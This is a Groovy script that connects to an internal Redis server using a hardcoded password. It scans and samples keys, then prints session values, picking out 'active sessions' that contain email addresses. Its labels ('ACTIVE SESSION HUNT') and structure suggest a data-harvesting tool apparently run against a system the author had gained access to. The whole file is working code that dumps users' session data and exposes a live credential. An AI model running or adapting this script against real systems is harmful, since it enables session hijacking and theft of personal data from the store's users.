import java.net.Socket
import java.io.BufferedReader
import java.io.InputStreamReader

def redisSession(String host, int port, String password) {
    Socket sock = new Socket()
    sock.connect(new java.net.InetSocketAddress(host, port), 5000)
    sock.setSoTimeout(5000)
    def os = sock.getOutputStream()
    def br = new BufferedReader(new InputStreamReader(sock.getInputStream()))
    os.write("AUTH ${password}\r\n".getBytes())
    os.flush()
    Thread.sleep(300)
    readAll(br)
    return [sock: sock, os: os, br: br]
}

def rCmd(sess, String cmd) {
    sess.os.write("${cmd}\r\n".getBytes())
    sess.os.flush()
    Thread.sleep(200)
    return readAll(sess.br)
}

def readAll(BufferedReader br) {
    def sb = new StringBuilder()
    try {
        while (true) {
            if (!br.ready()) { Thread.sleep(150); if (!br.ready()) break }
            def line = br.readLine()
            if (line == null) break
            sb.append(line).append('\n')
        }
    } catch (java.net.SocketTimeoutException e) {}
    return sb.toString().trim()
}

println "=== LIGHT SESSION SCAN + FAILED KEYS ==="

def sess = redisSession("172.27.140.151", 6379, "@st0rAg3K3Y")

// 1. Get the failed key
println "\n--- FAILED KEY ---"
println rCmd(sess, "GET failed_2020-08-31_12:35:48marketplace_20-08-31_12:35:47")

// 2. Scan for non-srqaclient keys via iterative scan
println "\n--- NON-SRQACLIENT KEYS (iterative scan) ---"
def cursor = "0"
def nonSrqaKeys = []
def iterations = 0
while (iterations < 30) {
    def resp = rCmd(sess, "SCAN ${cursor} COUNT 500")
    def lines = resp.split('\n').findAll { it.trim() && !it.startsWith('*') && !it.startsWith('\$') }
    if (lines.size() > 0) {
        cursor = lines[0].trim()
        lines.drop(1).each { key ->
            if (!key.startsWith('srqaclient_')) {
                nonSrqaKeys << key.trim()
            }
        }
    }
    iterations++
    if (cursor == "0") break
}
println "Scanned ${iterations} batches"
println "Non-srqaclient keys found: ${nonSrqaKeys.size()}"
nonSrqaKeys.each { println "  ${it}" }

// 3. Get values of non-srqa keys
if (nonSrqaKeys.size() > 0) {
    println "\n--- VALUES OF NON-SRQA KEYS ---"
    nonSrqaKeys.take(20).each { key ->
        println "\nKEY: ${key}"
        println "TYPE: ${rCmd(sess, "TYPE ${key}")}"
        def val = rCmd(sess, "GET ${key}")
        if (val.length() > 1000) val = val.substring(0, 1000) + "...[TRUNCATED]"
        println "VALUE: ${val}"
    }
}

// 4. Sample 100 random keys for active sessions (single connection)
println "\n--- ACTIVE SESSION HUNT (100 random) ---"
def activeFound = 0
(0..99).each { i ->
    def key = rCmd(sess, "RANDOMKEY").replaceAll('\\$\\d+\\n', '').trim()
    if (key.startsWith('srqaclient_')) {
        def val = rCmd(sess, "GET ${key}")
        if (val.contains('@') && !val.contains('"email";N;')) {
            activeFound++
            println "\nACTIVE SESSION #${activeFound}:"
            def clean = val.replaceAll('\\$\\d+\\n', '').trim()
            if (clean.length() > 800) clean = clean.substring(0, 800) + "..."
            println clean
        }
    }
}
println "\nActive sessions in 100 samples: ${activeFound}"

try { sess.sock.close() } catch(Exception e) {}
println "\n=== LIGHT SCAN DONE ==="
